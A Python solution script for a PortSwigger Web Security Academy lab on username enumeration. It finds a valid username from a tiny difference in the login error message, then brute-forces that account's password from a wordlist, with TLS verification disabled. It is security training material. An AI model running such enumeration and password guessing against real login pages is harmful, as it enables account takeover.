from requests import Session
from os import path
from urllib import parse
from urllib3 import disable_warnings, exceptions


def lab(url):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"})
    session.verify = False
    session.stream = False

    username = ''

    found = False
    with open(path.join(path.dirname(__file__), 'usernames.txt')) as users:
        for user in users:

            if found:
                found = False
                break

            username_encoded = parse.quote_plus(user.strip())
            data = f'username={username_encoded}&password=super-senha'

            response = session.post(url=url, data=data, allow_redirects=False)

            if 'Invalid username or password.' not in response.text:
                print(f'USERNAME {user.strip()}')
                username = user.strip()
                found = True

    found = False
    with open(path.join(path.dirname(__file__), 'passwords.txt')) as passwords:
        for password in passwords:

            if found:
                found = False
                break

            username_encoded = parse.quote_plus(username)
            password_encoded = parse.quote_plus(password.strip())
            data = f'username={username_encoded}&password={password_encoded}'

            response = session.post(url=url, data=data, allow_redirects=False)

            if 'Invalid username or password' not in response.text:
                print(f'USERNAME {username} PASSWORD {password.strip()}')
                found = True


# Username enumeration via subtly different responses
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
if __name__ == '__main__':
    disable_warnings(exceptions.InsecureRequestWarning)

    lab(
        'https://0ada000e03d2f0768361e32400da002e.web-security-academy.net/login'
    )
